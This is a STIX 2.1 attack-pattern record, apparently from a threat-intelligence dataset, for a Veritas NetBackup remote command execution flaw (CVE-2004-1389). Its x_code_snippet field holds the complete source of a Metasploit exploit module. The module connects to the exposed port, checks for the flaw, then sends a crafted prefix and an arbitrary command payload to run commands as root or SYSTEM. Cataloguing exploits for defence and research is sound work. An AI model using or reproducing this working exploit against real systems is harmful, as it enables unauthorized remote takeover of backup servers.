{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--46b4337d-f59d-40d2-9ee0-2d134bc4587f",
    "created": "2024-08-14T17:06:52.966426Z",
    "modified": "2024-08-14T17:06:52.96643Z",
    "name": "VERITAS NetBackup Remote Command Execution",
    "description": " This module allows arbitrary command execution on an ephemeral port opened by Veritas NetBackup, whilst an administrator is authenticated. The port is opened and allows direct console access as root or SYSTEM from any source address. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/veritas_netbackup_cmdexec.rb",
            "external_id": "veritas_netbackup_cmdexec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1389"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VERITAS NetBackup Remote Command Execution',\n      'Description'    => %q{\n          This module allows arbitrary command execution on an\n        ephemeral port opened by Veritas NetBackup, whilst an\n        administrator is authenticated. The port is opened and\n        allows direct console access as root or SYSTEM from\n        any source address.\n      },\n      'Author'         => [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-1389' ],\n          [ 'OSVDB', '11026' ],\n          [ 'BID', '11494' ]\n        ],\n      'Privileged'     => true,\n      'Platform'       => %w{ linux unix win },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => '',\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet',\n            }\n        },\n      'Targets'        =>\n        [\n          ['Automatic', { }],\n        ],\n      'DisclosureDate' => '2004-10-21',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    connect\n\n    sploit = rand_text_alphanumeric(10)\n    buf = \"\\x20\\x20\\x201\\x20\\x20\\x20\\x20\\x20\\x201\\necho #{sploit}\\n\"\n\n    sock.put(buf)\n    banner = sock.get_once\n\n    disconnect\n\n    if banner.to_s.index(sploit)\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    sploit = payload.encoded.split(\" \")\n\n    buf = \"\\x20\\x20\\x201\\x20\\x20\\x20\\x20\\x20\\x201\\n\"\n    buf << payload.encoded\n    buf << \"\\n\"\n\n    sock.put(buf)\n    res = sock.get_once\n\n    print_status(res.to_s)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-10-21",
    "x_mitre_platforms": [
        "%w{ linux unix win }"
    ]
}